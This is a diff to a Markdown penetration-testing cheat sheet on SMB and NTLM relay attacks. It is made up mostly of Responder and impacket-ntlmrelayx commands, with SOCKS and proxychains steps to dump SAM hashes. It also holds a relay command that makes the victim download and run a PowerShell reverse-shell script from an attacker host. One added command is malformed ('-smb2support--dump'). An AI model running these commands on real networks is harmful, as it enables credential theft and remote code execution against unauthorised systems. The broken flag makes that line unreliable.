@@ -18,6 +18,8 @@ Instead of stealing a password, the attacker **impersonates the legitimate SMB s
     - An attacker intercepts the authentication process.
     - Instead of cracking the intercepted credentials, the attacker relays them to another server to authenticate.
 
+---
+
 ## Basic Attack Process
 
 1. **Configuring Responder**:
@@ -49,9 +51,23 @@ Perform post-authentication actions:
 - Execute commands remotely.
 - Create a reverse shell.
 ```bash
-sudo impacket-ntlmrelayx -tf targets.txt --dump
-sudo impacket-ntlmrelayx -tf targets.txt -c "whoami"
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support--dump
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 ```
+
+Another interesting option that can be used is the `-socks` flag, that allows you to interact with the target using the relayed session.
+```bash
+sudo impacket-ntlmrelayx -tf targets.txt -socks
+```
+
+After obtaining the relay, use `proxychains` to execute the commands.
+
+```bash
+proxychains netexec smb <target-ip> -u <user> -p <anypassword> --sam
+```
+
+
+---
 
 ## RCE Attack Process
 - Copy the PowerShell Invoke-PowershellTCP.ps1 script and open it for editing. 
@@ -76,6 +92,10 @@ sudo responder -I eth0
 ```bash
 sudo impacket-ntlmrelayx -tf targets.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://<attacker_ip>:80/PS.ps1')"
 ```
+
+
+---
+
 ## IPv6 SMB Relaying Attack Process
 IPv6 relaying leverages the fact that many modern networks have IPv6 enabled by default, even if administrators primarily use IPv4. Attackers exploit IPv6 name resolution to trick clients into authenticating against a rogue server controlled by the attacker, allowing NTLM credentials to be captured and relayed.
 
@@ -112,5 +132,5 @@ Once a relay has been successfully established, you can access the account using
 proxychains crackmapexec smb <target-ip> -u <user> -p <anypassword> -d <domain>
 ```
 
----
+
 
